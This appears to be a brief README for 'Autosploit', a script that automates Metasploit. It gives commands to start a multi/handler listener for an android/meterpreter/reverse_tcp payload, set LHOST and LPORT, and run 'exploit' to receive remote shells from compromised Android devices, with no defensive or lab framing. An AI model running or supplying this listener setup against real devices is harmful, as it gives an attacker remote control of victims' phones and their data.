# Autosploit

This is a script that allows you to automate Metasploit using simple process.....

## Changes Needed

You need to change the file for your work

First you need to change the First Line for your work. For example I have used:
```
use multi/handler
```

Change the payload. Here for example I have used: 
```
android/meterpreter/reverse_tcp
```
Then change LHOST to your IP by typing ``` ifconfig ``` or ```sudo ifconfig```.

```
set LHOST <Your IP>
```
Then add the PORT. You can give any PORT number
```
set LPORT <Your PORT>
```
And now I have written ``` exploit``` to exploit the payload.
